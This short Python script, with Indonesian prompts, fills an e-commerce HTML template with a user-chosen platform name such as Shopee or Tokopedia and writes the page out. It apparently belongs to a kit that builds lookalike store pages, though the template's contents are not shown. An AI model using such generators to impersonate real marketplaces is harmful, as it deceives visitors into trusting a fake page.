#!/usr/bin/env python3
import os
import utils

R = '\033[31m'
G = '\033[32m'
C = '\033[36m'
W = '\033[0m'
Y = '\033[33m'

title = os.getenv('TITLE')
if title is None:
    title = input(f'{G}[+] {C}Judul toko/platform (contoh: Shopee, Tokopedia): {W}')
else:
    utils.print(f'{G}[+] {C}Judul platform :{W} '+title)

with open('template/ecommerce/index_temp.html', 'r', encoding='utf-8') as temp_index:
    temp_index_data = temp_index.read()
    if os.getenv("DEBUG_HTTP") == "1":
        temp_index_data = temp_index_data.replace('window.location = "https:" + restOfUrl;', '')
    temp_index_data = temp_index_data.replace('$PLATFORM$', title)

with open('template/ecommerce/index.html', 'w', encoding='utf-8') as updated_index:
    updated_index.write(temp_index_data)
